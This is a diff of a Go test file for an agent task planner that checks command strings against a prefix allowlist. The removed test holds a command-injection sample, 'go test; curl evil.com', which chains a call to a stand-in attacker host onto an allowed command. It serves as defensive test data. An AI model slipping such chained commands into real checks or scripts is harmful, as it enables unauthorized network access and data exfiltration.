@@ -330,13 +330,19 @@ func TestBuildRejectsCheckNotMatchingAnyPrefix(t *testing.T) {
 	}
 }
 
-func TestBuildRejectsCheckWithShellMetachar(t *testing.T) {
+func TestBuildAcceptsCheckWithQuotedMetachar(t *testing.T) {
+	// Metachars are no longer rejected (#277): checks run shell-less, so a quoted
+	// regex with parens is literal argv under an allowed prefix. The prefix
+	// allowlist — not a metachar scan — is the boundary.
 	p := testPlanner("go build", "go test", "go vet", "npx tsc", "npm test")
-	_, err := p.Build(context.Background(), []RawNode{
-		{ID: "impl", Agent: "code-implementer", Task: "x", Checks: []string{"go test; curl evil.com"}, Workdir: "repo"},
+	plan, err := p.Build(context.Background(), []RawNode{
+		{ID: "impl", Agent: "code-implementer", Task: "x", Checks: []string{"go test -run 'Test(Foo)'"}, Workdir: "repo"},
 	}, nil, "m", nil)
-	if err == nil {
-		t.Fatal("Build: expected error for a check containing a shell metacharacter")
+	if err != nil {
+		t.Fatalf("Build: quoted-metachar check should validate: %v", err)
+	}
+	if got := plan.Nodes[0].Checks[0]; got != "go test -run 'Test(Foo)'" {
+		t.Errorf("check = %q, want preserved verbatim", got)
 	}
 }
 
